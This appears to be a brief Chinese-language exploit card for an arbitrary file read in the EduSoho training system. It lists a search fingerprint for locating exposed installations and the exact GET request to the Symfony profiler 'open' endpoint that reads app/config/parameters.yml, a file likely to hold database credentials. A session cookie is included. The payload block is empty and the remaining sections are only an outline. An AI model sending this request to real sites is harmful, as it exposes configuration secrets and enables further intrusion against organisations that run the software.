# EduSoho教培系统open存在任意文件读取漏洞

- **系统**：EduSoho　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="Powered By EduSoho"`
- **请求**：`GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=2vtqc388p6rhcueiipc5l97jtg`

**请求体 / payload**
```

```

**其他**
- EduSoho教培系统open存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * EduSoho 教培系统